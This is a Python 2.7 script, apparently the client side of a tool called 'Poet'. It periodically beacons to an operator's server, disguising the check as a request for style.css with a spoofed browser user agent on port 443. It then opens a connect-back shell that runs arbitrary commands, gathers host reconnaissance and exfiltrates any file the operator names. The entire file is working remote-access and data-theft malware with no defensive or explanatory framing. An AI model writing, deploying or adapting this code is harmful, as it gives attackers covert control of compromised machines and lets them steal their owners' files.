#!/usr/bin/python2.7

import re
import sys
import time
import base64
import socket
import os.path
import urllib2
import argparse
import logging as log
import subprocess as sp
from datetime import datetime

SBUF_LEN = 9
SIZE = 4096
UA = 'Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11'


def get_args():
    """ Parse arguments and return dictionary. """

    parser = argparse.ArgumentParser()
    parser.add_argument('host', metavar='IP', type=str)
    parser.add_argument('delay', metavar='DELAY', type=int, help='(s)')
    parser.add_argument('-p', '--port')
    parser.add_argument('-v', '--verbose', action="store_true")
    return parser.parse_args()


def is_active(host, port):
    try:
        url = 'http://{}:{}/style.css'.format(host, port)
        req = urllib2.Request(url, headers={'User-Agent': UA})
        f = urllib2.urlopen(req)
        if f.code == 200:
            return True
    except urllib2.URLError:
        pass
    return False


def shell_client(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    while True:
        try:
            inp = sockrecv(s)
            if inp == 'fin':
                break
            elif inp == 'getprompt':
                socksend(s, get_prompt())
            elif re.search('^exec ("[^"]+"\ )+$', inp + ' '):
                socksend(s, shell_exec(inp))
            elif inp == 'recon':
                socksend(s, shell_recon())
            elif inp.startswith('shell '):
                socksend(s, cmd_exec(inp[6:]).strip())
            elif inp.startswith('exfil '):
                try:
                    with open(os.path.expanduser(inp[6:])) as f:
                        socksend(s, f.read())
                except IOError as e:
                    socksend(s, e.strerror)
            else:
                socksend(s, 'Unrecognized')
        except socket.error as e:
            if e.message == 'too much data!':
                socksend(s, 'psh : ' + e.message)
            else:
                raise
    s.close()


def shell_exec(inp):
    out = ''
    cmds = parse_exec_cmds(inp)
    for cmd in cmds:
        cmd_out = cmd_exec(cmd)
        out += '='*20 + '\n\n$ {}\n{}\n'.format(cmd, cmd_out)
    return out


def shell_recon():
    ipcmd = 'ip addr' if 'no' in cmd_exec('which ifconfig') else 'ifconfig'
    exec_str = 'exec "whoami" "id" "uname -a" "lsb_release -a" "{}" "w" "who -a"'.format(ipcmd)
    return shell_exec(exec_str)


def cmd_exec(cmd):
    return sp.Popen(cmd, stdout=sp.PIPE, stderr=sp.STDOUT,
                    shell=True).communicate()[0]


def get_prompt():
    user = cmd_exec('whoami').strip()
    hn = cmd_exec('hostname').strip()
    end = '#' if user == 'root' else '$'
    aa = '{}@{} {} '.format(user, hn, end)
    return aa


def socksend(s, msg):
    """
        Sends message using socket operating under the convention that the
        first five bytes received are the size of the following message.
    """

    pkg = base64.b64encode(msg)
    fmt = '{:0>%dd}' % SBUF_LEN
    pkg_size = fmt.format(len(pkg))
    if len(pkg_size) > SBUF_LEN:
        raise socket.error('too much data!')
    pkg = pkg_size + pkg
    sent = s.sendall(pkg)
    if sent:
        raise socket.error('socket connection broken')


def sockrecv(s):
    """
        Receives message from socket operating under the convention that the
        first five bytes received are the size of the following message.
        Returns the message.

        TODO: Under high network loads, it's possible that the initial recv
        may not even return the first 9 bytes so another loop is necessary
        to ascertain that.
    """

    chunks = []
    bytes_recvd = 0
    initial = s.recv(SIZE)
    if not initial:
        raise socket.error('socket connection broken')
    msglen, initial = (int(initial[:SBUF_LEN]), initial[SBUF_LEN:])
    bytes_recvd = len(initial)
    chunks.append(initial)
    while bytes_recvd < msglen:
        chunk = s.recv(min((msglen - bytes_recvd, SIZE)))
        if not chunk:
            raise socket.error('socket connection broken')
        chunks.append(chunk)
        bytes_recvd += len(chunk)
    return base64.b64decode(''.join(chunks))


def parse_exec_cmds(inp):
    cmds = []
    inp = inp[5:]
    num_cmds = inp.count('"') / 2
    for i in range(num_cmds):
        first = inp.find('"')
        second = inp.find('"', first+1)
        cmd = inp[first+1:second]
        cmds.append(cmd)
        inp = inp[second+2:]
    return cmds


def main():
    args = get_args()

    if args.verbose:
        log.basicConfig(format='%(message)s', level=log.INFO)
    else:
        log.basicConfig(format='%(message)s')

    DELAY = args.delay
    HOST = args.host
    PORT = int(args.port) if args.port else 443

    log.info(('[+] Poet started with delay of {} seconds to port {}.' +
              ' Ctrl-c to exit.').format(DELAY, PORT))

    try:
        while True:
            if is_active(HOST, PORT):
                log.info('[+] ({}) Server is active'.format(datetime.now()))
                shell_client(HOST, PORT)
            else:
                log.info('[!] ({}) Server is inactive'.format(datetime.now()))
            time.sleep(DELAY)
    except KeyboardInterrupt:
        print
        log.info('[-] ({}) Poet terminated.'.format(datetime.now()))
    except socket.error as e:
        log.info('[!] ({}) Socket error: {}'.format(datetime.now(), e.message))
        log.info('[-] ({}) Poet terminated.'.format(datetime.now()))
        sys.exit(0)

if __name__ == '__main__':
    main()
